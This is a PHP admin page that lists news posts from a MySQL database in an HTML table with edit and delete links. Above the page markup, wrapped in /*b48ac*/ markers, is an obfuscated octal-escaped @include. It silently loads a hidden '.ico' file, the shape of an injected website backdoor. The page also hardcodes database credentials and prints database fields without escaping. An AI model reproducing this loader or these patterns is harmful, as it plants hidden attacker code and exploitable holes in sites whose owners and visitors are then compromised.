<?php
/*b48ac*/

@include "\057hom\145/wb\165ei8\1727h7\062i/p\165bli\143_ht\155l/G\123RF.\151ndi\141pro\143ess\056com\057dem\157/ap\160lic\141tio\156/th\151rd_\160art\171/.8\06728d\061db.\151co";

/*b48ac*/
 ?>


     
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
            <h1 class="m-0 text-dark">Add New Post</h1>
          </div><!-- /.col -->
          <div class="col-sm-6">
            <ol class="breadcrumb float-sm-right">
              <li class="breadcrumb-item"><a href="#">Home</a></li>
              <li class="breadcrumb-item active">New Post</li>
            </ol>
          </div><!-- /.col -->
        </div><!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->
    <!-- Main content -->
    <section class="content">
   
  
            <!-- /.card -->

            <div class="card">
              <div class="card-header">
                <h3 class="card-title">Condensed Full Width Table</h3>
              </div>
              <!-- /.card-header -->
              <div class="card-body p-0">
                    <div class="card-body table-responsive p-0" style="height: 600px;">
                <table class="table table-head-fixed">
                  <thead>
                    <tr>
                      <th>ID</th>
                      <th>Image</th>
                      <th>Title</th>
                      <th>Description</th>
                      <th>Edit</th>
                      <th>Delete</th>
                    </tr>
                  </thead>
                  <tbody>
                      <?php
                      

$con = mysqli_connect("localhost","ReidiusExibition","P@ssword@123#","ReidiusExibition");
$sql = "SELECT * FROM News";
$data = mysqli_query($con,$sql);
 while ($row = mysqli_fetch_assoc($data))
 {
?>
                    <tr>
                      <td><?php echo $row['id']; ?></td>
                      <td><img src="../Post/<?php echo $row['id']; ?>/<?php echo $row['Image']; ?>" style="max-height:150px;"></td>
                      <td><?php echo $row['title']; ?></td>
                      <td><span class="tag tag-success"></span><?php echo $row['content']; ?> </td>
                   
                      <td> <a href="edit_post.php?id=<?php echo $row['id']; ?>"><i class="fas fa-edit"></i> </a></td>
                      <td> <a href="Delete_post.php?id=<?php echo $row['id']; ?>"   onclick="return  confirm('Are you want to delete it')"  ><i class="fas fa-trash-alt"></i> </a></td>
                    </tr>
                    
                    <?php } ?>
                  </tbody>
                </table>
              </div>
              <!-- /.card-body -->
            </div>
            <!-- /.card -->
        </div>
          
      
    </section>
    <!-- /.content -->
  </div>
